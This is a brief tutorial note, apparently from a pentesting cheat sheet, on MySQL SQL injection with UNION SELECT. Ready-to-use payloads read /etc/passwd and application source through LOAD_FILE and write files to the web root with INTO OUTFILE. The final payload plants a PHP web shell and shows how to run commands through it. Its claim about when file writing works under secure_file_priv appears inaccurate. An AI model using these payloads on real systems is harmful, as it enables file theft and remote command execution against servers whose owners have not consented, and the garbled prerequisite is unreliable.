SQL Load file
##############

Description
************

from our previous example, you can load any file into the output as long
as the database user has access to the file on the server.

Example 1:

.. code-block:: console

   cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -

Example 2:

.. code-block:: console

   cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -

If the secure_file_priv is set you can also write files to the server

Example:

.. code-block:: console

   cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -

or:

Example 2:

.. code-block:: console

   cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -

And then request shell.php?0=id
